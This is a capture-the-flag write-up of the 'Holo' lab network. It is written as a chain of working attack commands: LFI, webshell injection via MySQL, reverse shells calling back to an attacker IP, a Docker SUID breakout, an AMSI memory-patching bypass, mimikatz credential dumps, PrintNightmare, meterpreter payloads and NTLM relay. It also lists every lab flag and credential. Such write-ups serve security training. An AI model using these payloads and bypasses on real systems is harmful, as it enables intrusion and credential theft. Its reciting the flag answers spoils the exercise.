# Holo - Hard

1. [Flag Submission Panel](#flag-submission-panel)
2. [.NET Basics](#net-basics)
3. [Initial Recon](#initial-recon)
4. [Web App Exploitation - 1](#web-app-exploitation---1)
5. [Post Exploitation - 1](#post-exploitation---1)
6. [Situational Awareness - 1](#situational-awareness---1)
7. [Docker Breakout](#docker-breakout)
8. [Privilege Escalation - 1](#privilege-escalation---1)
9. [Post Exploitation - 2](#post-exploitation---2)
10. [Pivoting](#pivoting)
11. [Command and Control](#command-and-control)
12. [Web App Exploitation - 2](#web-app-exploitation---2)
13. [AV Evasion](#av-evasion)
14. [Post Exploitation - 3](#post-exploitation---3)
15. [Situtational Awareness - 2](#situational-awareness---2)
16. [Privilege Escalation - 2](#privilege-escalation---2)
17. [Persistence](#persistence)
18. [NTLM Relay](#ntlm-relay)

## Flag Submission Panel

```markdown
1. What flag can be found inside of the container? - HOLO{175d7322f8fc53392a417ccde356c3fe}

2. What flag can be found after gaining user on L-SRV01? - HOLO{3792d7d80c4dcabb8a533afddf06f666}

3. What flag can be found after rooting L-SRV01? - HOLO{e16581b01d445a05adb2e6d45eb373f7}

4. What flag can be found on the Web Application on S-SRV01? - HOLO{bcfe3bcb8e6897018c63fbec660ff238}

5. What flag can be found after rooting S-SRV01? - HOLO{50f9614809096ffe2d246e9dd21a76e1}

6. What flag can be found after gaining user on PC-FILESRV01? - HOLO{2cb097ab8c412d565ec3cab49c6b082e}

7. What flag can be found after rooting PC-FILESRV01? - HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}

8. What flag can be found after rooting DC-SRV01? - HOLO{29d166d973477c6d8b00ae1649ce3a44}
```

## .NET Basics

* Many Windows apps are built in C# and its underlying tech, .NET - this allows devs to interact with CLR (Common Language Runtime) and Win32 API.

* CLR is the run-time environment used by .NET; any .NET language (C#, PowerShell, etc.) can be used to compile into CIL (Common Intermediary Language).

* .NET consists of 2 different branches:

  * .NET framework (only Windows)
  * .NET core (cross-compatible)

* The main component of .NET is .NET assemblies, which are compiled .exes and .dlls that any .NET language can execute.

* In order to create a solution file for .NET core in ```Visual Studio```, navigate to 'Create a new project' > Console App (.NET Core) > Configure project name, location, solution name - this creates a C# file.

* To build a solution file, navigate to Build > Build Solution.

## Initial Recon

```shell
nmap -sV -sC -p- -v 10.200.112.0/24
#scan given range

#two hosts are up

#we need to scan web server
nmap -sV -sC -p- -v 10.200.112.33

#aggressive scan for only open ports
nmap -A -p 22,80,33060 -v 10.200.112.33
```

* It is given that our scope of engagement is 10.200.x.0/24 and 192.168.100.0/24 - we can scan the ranges provided.

* As the public-facing web server is up at 10.200.112.33, we can scan all ports.

* Open ports and services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29
  * 33060 - mysqlx

```markdown
1. What is the last octet of the IP address of the public-facing web server? - 33

2. How many ports are open on the web server? - 3

3. What CME is running on port 80 of the web server? - wordpress

4. What version of the CME is running on port 80 of the web server? - 5.5.3

5. What is the HTTP title of the web server? - holo.live
```

## Web App Exploitation - 1

```shell
sudo vim /etc/hosts
#map holo.live to L-SRV01 IP

wfuzz -u holo.live -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live"
#vhost fuzzing

#filter out false positives
wfuzz -u holo.live -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live" --hw 1402

sudo vim /etc/hosts
#add enumerated subdomains

gobuster dir -u www.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

gobuster dir -u dev.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

gobuster dir -u admin.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

#using LFI in dev page, get creds
#log into admin dashboard

#check for RCE by fuzzing in admin page
wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

#filter responses with certain word size
wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hw 0
#this gives us a valid parameter

#we now have rce on admin dashboard page
```

* After adding the IP address of L-SRV01 and the domain to '/etc/hosts' file, we can use ```gobuster``` or ```wfuzz``` to check for virtual hosts.

* After running ```wfuzz```, we get some subdomains, which can be inspected further by adding them to '/etc/hosts'.

* Now, in the discovered subdomains, we need to scan the web directories to check for interesting files - we can use ```gobuster``` for this.

* Scanning the web directories shows that we have 'robots.txt' file in the subdomains 'www.holo.live' and 'admin.holo.live'.

* For the first subdomain, 'robots.txt' discloses the web server's current directory as ```/var/www/wordpress```.

* For the admin subdomain, 'robots.txt' contains a few disallowed files - one of them includes a .txt file which could contain creds.

* We cannot access this file, but now we have the directory disclosure here for admin subdomain as ```/var/www/admin```.

* Now, we can see that in the subdomain 'dev.holo.live', the images are loaded using 'img.php' file; however, it makes use of the 'file' parameter to do so:

  ```http://dev.holo.live/img.php?file=images/korone.jpg```

* This could be vulnerable to Local File Inclusion due to the presence of parameters; we can attempt to check for directory traversal here.

* For example, on the development domain, using Burp Suite's Repeater with this request, we can access ```/etc/passwd``` file:

  ```/img.php?file=../../../etc/passwd```

* Now, we can access the .txt file found earlier from the admin subdomain - this gives us the creds required for logging into the admin page.

* The admin page shows a dashboard - we can check for ways to get a shell on the target now.

* Here, we can attempt to identify RCE by fuzzing for a vulnerable parameter using ```wfuzz```.

* Using the parameter 'cmd', we get a valid response - we now have RCE on L-SRV01.

* Running the ```id``` command shows us that we are running commands as 'www-data'.

```markdown
1. What domains loads images on the first web page? - www.holo.live

2. What are the two other domains present on the web server? - admin.holo.live,dev.holo.live

3. What file leaks the web server's current directory? - robots.txt

4. What file loads images for the development domain? - img.php

5. What is the full path of the credentials file on the administrator domain? - /var/www/admin/supersecretdir/creds.txt

6. What file is vulnerable to LFI on the development domain? - img.php

7. What parameter in the file is vulnerable to LFI? - file

8. What file found from the information leak returns an HTTP error code 403 on the administrator domain? - /var/www/admin/supersecretdir/creds.txt

9. Using LFI on the development domain read the above file. What are the credentials found from the file? - admin:DBManagerLogin!

10. What file is vulnerable to RCE on the administrator domain? - dashboard.php

11. What parameter is vulnerable to RCE on the administrator domain? - cmd

12. What user is the web server running as? - www-data
```

## Post Exploitation - 1

```shell
nc -nvlp 4444

#use reverse-shell one-liner in RCE
#using the nc binary

#we get reverse shell
id

#upgrade to fully interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

#Ctrl+Z to background shell

stty raw -echo; fg
#press Enter twice

#we have upgraded shell
ls
```

* As we have RCE now, we can use that to get a reverse shell.

* After setting up a listener, we can make use of ```nc``` binary present on the target machine to get reverse shell:

  ```http://admin.holo.live/dashboard.php?cmd=which%20nc```

  ```http://admin.holo.live/dashboard.php?cmd=/bin/nc -c sh 10.50.109.20 4444```

* We can now upgrade this to a fully interactive TTY shell.

## Situational Awareness - 1

```shell
#in reverse shell on L-SRV01
hostname
#random hostname

ls -la /
#includes .dockerenv

cat /proc/1/cgroup
#includes docker in the paths provided

ls -la /var/www
#includes flag

cd /tmp

#create a primitive port scanner
vi port-scan.sh

chmod +x port-scan.sh

./port-scan.sh
#shows open ports

#port 3306 is open
#it could be running mysql

#check for mysql creds
find / -name db_connect.php 2>/dev/null

cat /var/www/admin/db_connect.php
#this contains creds

mysql -u admin -p -h 192.168.100.1
#log into mysql

#in mysql
show databases;

use DashboardDB;

show tables;

select * from users;
#print all columns of table
```

```shell
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/192.168.100.1/$port && echo $port is open || /dev/null" 
done
```

* Using ```hostname``` we can see that it is a random string - this shows that we could be inside a Docker environment.

* We can confirm this by checking for '.dockerenv' file in the root directory, and by checking the contents of the file ```/proc/1/cgroup``` - this contains 'docker' in its paths.

* We can get the first flag from ```/var/www``` directory.

* Now, as a part of situational awareness, ```ifconfig``` shows that our IP is 192.168.100.100

* Therefore, following the format, we know that the gateway for the Docker container would be 192.168.100.1

* Now, we can build a primitive bash port-scanner script to scan internal ports.

* Scanning these ports on the Docker container gateway shows that ports 22,80,3306 and 8080 are open.

* Port 3306 usually runs a database service like ```mysql``` - we need to check for creds.

* Checking for the common file 'db_connect.php', we can see that it is located in ```/var/www/admin```.

* This gives us the server address of the remote database, creds "admin:!123SecureAdminDashboard321!" and database name.

* We can use this info to log into ```mysql``` - we need to access 'DashboardDB'.

* This contains a 'users' table which gives us the creds "admin:DBManagerLogin!" and "gurag:AAAA"

```markdown
1. What is the Default Gateway for the Docker Container? - 192.168.100.1

2. What is the high web port open in the container gateway? - 8080

3. What is the low database port open in the container gateway? - 3306

4. What is the server address of the remote database? - 192.168.100.1

5. What is the password of the remote database? - !123SecureAdminDashboard321!

6. What is the username of the remote database? - admin

7. What is the database name of the remote database? - DashboardDB

8. What username can be found within the database itself? - gurag
```

## Docker Breakout

```shell
#we have access to remote database
#we can exploit it by injection

#injects PHP code into table
#and saves table to file on remote system
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell-sv.php';
```

```shell
#now we can use curl
#to get RCE

#exit mysql

curl 192.168.100.1:8080/shell-sv.php?cmd=id
#www-data

#on attacker machine
#create shellscript for reverse shell
vim shellscript.sh

python3 -m http.server 80

#setup listener
nc -nvlp 53

#in victim machine rce
#execute url-encoded command
curl 'http://192.168.100.1:8080/shell-sv.php?cmd=curl%20http%3A%2F%2F10.50.109.20%3A80%2Fshellscript.sh%7Cbash%20%26'
#this gives us reverse shell on listener

cat /var/www/user.txt
#get flag
```

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.50.109.20/53 0>&1
```

* According to given info, we can attempt to escape the container by exploiting the remote database.

* The methodology to be followed is:

  * Access remote database using admin creds
  
  * Create new table in main database

  * Inject PHP code to gain command execution

  * Drop table contents onto a file the user can access

  * Execute and obtain RCE on host

* After running the injection command in ```mysql```, we can exit it and use ```curl``` for RCE.

* We can now use this RCE to get a stable reverse shell on the box; we will use a shell script for this, hosted from attacker machine.

* This would be executed from the RCE on target box so as to get reverse shell on our listener; we can use ```curl``` to execute it:

  ```curl http://10.50.109.20:80/shellscript.sh|bash &```

* We need to URL-encode this command before passing it as parameter to the RCE command.

* We can get the user flag from the L-SRV01 box.

```markdown
1. What user is the database running as? - www-data
```

## Privilege Escalation - 1

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /tmp

#setup http server in attacker machine

wget http://10.50.109.20:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#check for privesc

#docker has SUID bit set
#exploit from GTFObins

docker images
#we have ubuntu image

/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
#we get root shell

cat /root/root.txt
#root flag
```

* Now that we have shell as 'www-data' user on L-SRV01, we can attempt for privesc using ```linpeas```.

* This shows that ```docker``` has SUID bit set, we can get exploit from GTFObins.

* Upon privilege escalation, we get shell as root on L-SRV01; we can get root flag from the /root directory.

```markdown
1. What is the full path of the binary with an SUID bit set on L-SRV01? - /usr/bin/docker

2. What is the full first line of the exploit for the SUID bit? - sudo install -m =xs $(which docker) .
```

## Post Exploitation - 2

```shell
#in root shell on L-SRV01
cat /etc/shadow

#get hash for linux-admin user

#in attacker machine
vim hash.txt
#sha512crypt hash

hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

* We can now attempt to extract hashes from the shadow file.

* Using ```hashcat```, we can crack the password for the user 'linux-admin'.

```markdown
1. What non-default user can we find in the shadow file on L-SRV01? - linux-admin

2. What is the plaintext cracked password from the shadow hash? - linuxrulez
```

## Pivoting

```shell
ssh linux-admin@10.200.112.33
#ssh into L-SRV01

ls -la /usr/bin/docker
#SUID bit set

/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
#we get root on L-SRV01

#for pivoting, we can use sshuttle
#on attacker machine
sshuttle -r linux-admin@10.200.112.33 10.200.112.0/24 -x 10.200.112.33
#proxy in 10.200.112.0/24 network with L-SRV01 10.200.112.33 excluded from subnet

#to scan internal hosts
#ping sweep from L-SRV01
for i in {1..254} ;do (ping -c 1 10.200.112.$i | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &) ;done
#this gives us alive hosts

#check for open ports on alive hosts
for ip in 30 31 35; do echo "10.200.112.$ip:"; for i in {1..15000}; do echo 2>/dev/null > /dev/tcp/10.200.112.$ip/$i && echo "$i open"; done; echo " ";done;
#this gives us a list of open ports
```

* Now, we have root access to L-SRV01; as we have password for user 'linux-admin', we can SSH into L-SRV01 and then use the ```docker``` SUID exploit to get root.

* We need to pivot now using a tool like ```chisel``` or ```sshuttle``` in order to access the internal network.

* By running ```sshuttle``` on our attacker machine, we manage to get access to the internal network.

* Now, using our SSH access on L-SRV01, we can scan the internal network for alive hosts.

* We cannot use ```nmap``` in this case due to ICMP errors, so we can use a Bash one-liner to scan the network; this gives us the following hosts:

  * 10.200.112.1
  * 10.200.112.30
  * 10.200.112.31
  * 10.200.112.33
  * 10.200.112.35
  * 10.200.112.250

* Excluding the first and last host, and L-SRV01 itself, we have hosts ending with .30, .31 and .35

* We need to check for open ports on these machines now - for this, we can use another bash one-liner.

* Running this command, we get open ports for all three hosts - the open ports show that all the machines in the internal network are Windows hosts.

* As port 80 is open on all machines, we can now check the webpages for the hosts from our attacker machine.

* 10.200.112.30 and 10.200.112.35 have default IIS landing webpages, but 10.200.112.31 has an administrator login page, similar to the one seen previously - we can check it later.

## Command and Control

```shell
#to setup covenant
#download .NET Core SDK 3.1.0
#setup 
mkdir -p $HOME/dotnet && tar zxf dotnet-sdk-3.1.426-linux-x64.tar.gz -C $HOME/dotnet

export DOTNET_ROOT=$HOME/dotnet

export PATH=$PATH:$HOME/dotnet

#also edit .zshrc file to permanently add commands
vim ~/.zshrc
#add :$HOME/dotnet to end of existing PATH
#add export DOTNET_ROOT=$HOME/dotnet

dotnet
#this runs .NET command

#download covenant
cd /opt

git clone --recurse-submodules https://github.com/cobbr/Covenant

sudo ~/dotnet/dotnet run --project /opt/Covenant/Covenant
#we can navigate to localhost:7443 to access Covenant
```

* We can use a C2 server to organize users & deploy modules on a compromised device; in this case, we can use [Covenant](https://github.com/cobbr/Covenant)

* Once we run ```Covenant``` using ```dotnet```, we can access it on <http://127.0.0.1:7443>

* Within ```Covenant```, there are 4 main stages:

  * Creating a listener
  * Generating a stager
  * Deploying a grunt
  * Utilizing the grunt

## Web App Exploitation - 2

```shell
#access S-SRV01 home page
#scan for directories
feroxbuster -u http://10.200.112.31 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
```

* We have identified a new target, S-SRV01 which has a webpage at 10.200.112.31

* We have a couple of possible usernames - 'admin', 'gurag' - from the previous credentials.

* We also have a password reset functionality - trying the username 'gurag' makes the website send a password reset to the email address.

* Going through the cookies and JSON responses from 'Developer Tools' (under the Network or Storage tab), we get a 'user_token' value.

* As the token is leaked to client-side here, we can exploit this in the URL query; feed the token value to '?token' parameter.

* This redirects us to a 'reset.php' page - we can set any password for 'gurag' user.

* We can login to <http://10.200.112.31> now using the creds 'gurag:password123' - this leads us to a home page with an 'Upload Image' functionality.

* From code analysis, it seems the page uses client-side filtering; these can be bypassed using Burp Suite.

* The source code for the webpage shows that it uses whitelisting - any image that isn't ```image/jpeg``` is denied.

* We can try uploading an image file - it gets uploaded.

* Using ```feroxbuster```, we get a directory /images - this contains the uploaded image file.

* So, we can follow the client-side filter bypass technique shown by using Burp Suite, and intercepting "Response to this request" (Server's response), and deleting the JS function/script.

* Now, we can upload a PHP webshell, and go to /images - we have our webshell.

* However, this does not work; there could be some AV at use here.

```markdown
1. What user can we control for a password reset on S-SRV01? - gurag

2. What is the name of the cookie intercepted on S-SRV01? - user_token

3. What is the size of the cookie intercepted on S-SRV01? - 110

4. What page does the reset redirect you to when successfully authenticated on S-SRV01? - reset.php
```

## AV Evasion

* AMSI (Anti-Malware Scan Interface) - PowerShell security feature that will allow any apps/services to integrate into antimalware products; it scans payloads & scripts before execution, inside of runtime.

* [Common bypasses](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) (usually written in PowerShell and C#) for AMSI include:

  * Patching ```amsi.dll```
  * Amsi ScanBuffer patch
  * Forcing errors
  * Matt Graeber's Reflection
  * PowerShell downgrade

* Matt Graeber's Reflection:

```[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)```

* Patching ```amsi.dll```:

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";
#uses C# to call-in functions from Kernel32
#to identify where amsi.dll has been loaded

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
#load C# and identify AmsiScanBuffer string
#to get address location

[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);

#modify memory permissions and patch amsi.dll
#in order to return a specified value
```

* Signatures for most AMSI bypasses have been crafted, so AMSI & Defender themselves will catch these bypasses; we need to obfuscate them to evade signatures.

* Tools such as the [AMSITrigger script](https://github.com/RythmStick/AMSITrigger) can help us in manual obfuscation; this script will take a given PowerShell script and identify what strings are used to flag the script as malicious.

* String concatenation is a common technique used in manual obfuscation; for string literals & constants, concatenation occurs at compile-time, whereas for string variables, concatenation occurs at run-time.

* Type acceleration is another method used in manual obfuscation; we can abuse them to modify malicious types and break signatures.

* For automated obfuscation, we can use obfuscators such as [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and ISE-Steroids.

* For code analysis and review to break signatures, we can use tools like [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) and [DefenderCheck](https://github.com/matterpreter/DefenderCheck).

## Post Exploitation - 3

```shell
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

```shell
#use crackmapexec to find endpoints where creds can be used
crackmapexec smb 10.200.112.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9
#-d for domain, found from mimikatz dump

#evil-winrm pass-the-hash does not work

#xfreerdp works
xfreerdp /v:10.200.112.35 /u:watamet /p:Nothingtoworry!
```

```ps
#in PowerShell session in PC-FILESRV01
#fetch script from Python server on attacker machine

certutil.exe -urlcache -f http://10.50.109.20/applocker-checker.ps1 applocker-checker.ps1

.\applocer-checker.ps1
#runs the script
```

* As we were unable to make a simple webshell work, we will have to use another technique for AV evasion.

* Trying another version of a simple PHP webshell works in this case - we are able to get RCE on S-SRV01.

* ```whoami``` command shows that we are 'system' user - we can get the flag from Admin's desktop.

* We can now use ```mimikatz``` to dump creds on S-SRV01.

* ```certutil``` can be used to transfer the binary to S-SRV01 (remember to host the Python server):

  ```certutil.exe -urlcache -f http://10.50.109.20/mimikatz64.exe mimikatz.exe```

* As ```mimikatz``` has its own CLI, we need to send all commands required in a single command.

* The crafted command will dump account creds authenticated to endpoint:

  ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit```

* This dumps the required creds; we get the password for user 'watamet'

* We can also use a pass-the-hash attack with tools such as ```crackmapexec``` and ```evil-winrm```

* Using ```crackmapexec```, we are able to find that the creds for user 'watamet' can be used for DC-SRV01, S-SRV01 and PC-FILESRV01.

* We can try getting a shell on PC-FILESRV01 using ```evil-winrm``` but it does not work.

* As we have creds anyways, we can login as 'watamet' using ```xfreerdp``` - user flag can be found on Desktop.

* While attempting to perform situational awareness, we are getting errors due to whitelist application controls set on the server; AppLocker is being used here.

* The policy config for AppLocker is located in ```secpol.msc``` (local/group security policy editor).

* The key rule types under 'Application Control Policies' are:

  * Executable Rules
  * Windows Installer Rules
  * Script Rules
  * Packaged app Rules

* Techniques used to bypass AppLocker:

  * Abuse misconfigs within rules
  * Signed/Verified packages & binaries (LOLBAS)
  * PowerShell downgrade
  * Alternate Data Streams

* We can check for directories that can be used to execute programs using tools like [AppLocker directory checker script](https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1)

* In the RDP session, open PowerShell and fetch the script from attacker machine; running it shows us the directories we can execute programs in:

  * ```C:\Windows\Tasks```
  * ```C:\Windows\tracing```
  * ```C:\Windows\System32\spool\drivers\color```
  * ```C:\Windows\tracing\ProcessMonitor```

```markdown
1. What domain user's credentials can we dump on S-SRV01? - watamet

2. What is the domain user's password that we can dump on S-SRV01? - Nothingtoworry!

3. What is the hostname of the remote endpoint we can authenticate to? - PC-FILESRV01
```

## Situational Awareness - 2

```shell
#in cmd prompt in PC-FILESRV01
certutil.exe -urlcache -f http://10.50.109.20/Seatbelt.exe seatbelt.exe

copy seatbelt.exe C:\Windows\Tasks
#run from path where AppLocker allows running programs

cd C:\Windows\Tasks

seatbelt.exe -group=system
#run seatbelt

seatbelt.exe -group=all -full
#gives a lot of output
#redirect output to a file for easy search
```

```ps
#in PowerShell
cd C:\Windows\Tasks

certutil.exe -urlcache -f http://10.50.109.20/PowerView.ps1 PowerView.ps1

Import-Module .\PowerView.ps1
#to use the script

Get-NetLocalGroup
#list all groups

Get-NetLocalGroupMember -Group Administrators
#list all members of local group 'Administrators'

Get-NetLoggedon
#list all users currently logged onto system

Get-DomainGPO
#list AD domain GPOs installed

Find-LocalAdminAccess
#check if current user is local admin at any connected system

Get-ScheduledTask
#list all scheduled tasks
#we can filter paths using -TaskPath

Get-ScheduledTaskInfo -TaskName "Microsoft\Windows\Shell\CreateObjectTask"
#shows info on task given

whoami /priv

Import-Module ActiveDirectory; Get-ADGroup
#enumerate user groups within AD
#prompted to enter filter - use <samAccountName -like "*">
```

* For situational awareness, we can use the ```Seatbelt``` tool; instead of building the app file, we can use precompiled binaries.

* We can run ```Seatbelt``` after transferring the .exe file to PC-FILESRV01; move it to one of the paths given above, where it is allowed to run.

* We can use ```PowerView``` after this to enumerate users & groups in system.

* ```Find-LocalAdminAccess``` command (part of PowerView module) shows that we have local admin access to S-SRV01.holo.live

```markdown
1. What anti-malware product is employed on PC-FILESRV01? - AMSI

2. What anti-virus product is employed on PC-FILESRV01? - Windows Defender

3. What CLR version is installed on PC-FILESRV01? - 4.0.30319

4. What PowerShell version is installed on PC-FILESRV01? - 5.1.17763.1

5. What Windows build is PC-FILESRV01 running on? - 17763.1577
```

## Privilege Escalation - 2

```ps
dir C:\Users\watamet\Applications
#contains the odd exe file

Get-ScheduledTask -TaskPath "\Users\*"
#should include the exe

#we can try the DLL hijacking method
#by creating kavremoverENU.dll
#but it does not work

#try PrintNightmare exploit
certutil.exe -urlcache -f http://10.50.109.20/CVE-2021-1675.ps1 CVE-2021-1675.ps1

Import-Module .\CVE-2021-1675.ps1

Invoke-Nightmare -NewUser "sv" -NewPassword "password123"

net user sv
#shows that it is part of Administrators group
```

* We are able to find an application 'kavremover.exe' in the user's Applications folder, and it is supposed to be a scheduled task but it does not show up as one.

* Either way we can proceed with DLL hijacking technique for privesc.

* For the vulnerable app we found, there are a few reference guides that can be followed for DLL hijacking - but those do not work for some reason.

* As this is an older machine, we can instead use a newer exploit like [PrintNightmare](https://github.com/calebstewart/CVE-2021-1675).

* Transfer the script to victim server and run it - this exploits the vulnerability and we now have Admin access.

* We can get a new shell using ```evil-winrm``` and login as the newly created user to get root flag.

```markdown
1. What is the name of the vulnerable application found on PC-FILESRV01? - kavremover
```

## Persistence

* Vulnerable DLL locations can be searched using tools like ProcMon or Processhacker2; these vulnerable DLLs can be found by using filters or PIDs for instance.

* Requirements for a DLL to be vulnerable:

  * Defined by target app
  * Ends with .DLL
  * Must be run by target app
  * DLL does not exist on system
  * Write privileges for DLL location

```markdown
1. What is the first listed vulnerable DLL located in the Windows folder from the application? - wow64log.dll
```

## NTLM Relay

```shell
#install the required packages
sudo apt install krb5-user cifs-utils

#open a new rdp session as admin user created earlier
xfreerdp /v:10.200.112.35 /u:sv /p:"password123"

#open command prompt as admin user
#and config the SMB services
sc stop netlogon

sc stop lanmanserver

sc config lanmanserver start= disabled

sc stop lanmanworkstation

sc config lanmanworkstation start= disabled

shutdown -r
#restart the machine
```

```shell
#in attacker machine
#create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.109.20 LPORT=1337 -f exe > shell.exe

msfconsole -q

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 10.50.109.20

set LPORT 1337

run

#in another tab
#setup ntlmrelayx
ntlmrelayx.py -t smb://10.200.112.30 -smb2support -socks

#get rdp session
#xfreerdp is not working, so we use rdesktop instead
rdesktop -u sv -p password123 10.200.112.35

#in victim cmd prompt
certutil.exe -urlcache -f http://10.50.109.20:8080/shell.exe shell.exe

shell.exe
#we get reverse shell

#on meterpreter reverse shell
getuid

getsystem
#privesc

portfwd add -R -L 0.0.0.0 -l 445 -p 445
#setup port forwarding

#config proxy settings
sudo vim /etc/proxychains4.conf
#add this line
#socks4 127.0.0.1 1080

proxychains psexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.112.30
#this does not work, so we can try smbexec.py

proxychains smbexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.112.30
#we get shell

net user newuser password1 /add

net localgroup Administrators /add newuser

#we can now get the flag

#in attacker machine
secretsdump.py 'HOLOLIVE/newuser:password1@10.200.112.30'
#dumps creds
```

* If a server sends out SMB connections, we can abuse NTLM relaying to get the hashes - we can use tools such as ```responder``` or ```ntlmrelayx```.

* Before any of these attacks are used, we first need to check for hosts with SMB signing disabled - we can check this using ```nmap``` or ```crackmapexec```.

* The system at 10.200.112.30 is our target; we can now follow the given process for NTLM relay attack.

* Disable the SMB services in the ```evil-winrm``` shell that we have as admin user and restart the server.

* Then, we create our payload to be executed on the server; we get a reverse shell on our machine.

* Simultaneously, setup ```ntlmrelayx``` for relay client to route sessions through SOCKS proxy.

* Now, on our ```meterpreter``` reverse shell, after using 'getsystem' to elevate our privileges, we can use port forwarding.

* After a few minutes, our ```ntlmrelayx``` prompt shows that we have a working relay from S-SRV02.

* We need to config proxy settings to tunnel through SOCKS session created by ```ntlmrelayx```; edit the file at ```/etc/proxychains4.conf```.

* Then, we can use the tools, namely ```secretsdump.py``` and ```proxychains``` to help us in dumping hashes.

```markdown
1. What host has SMB signing disabled? - DC-SRV01
```
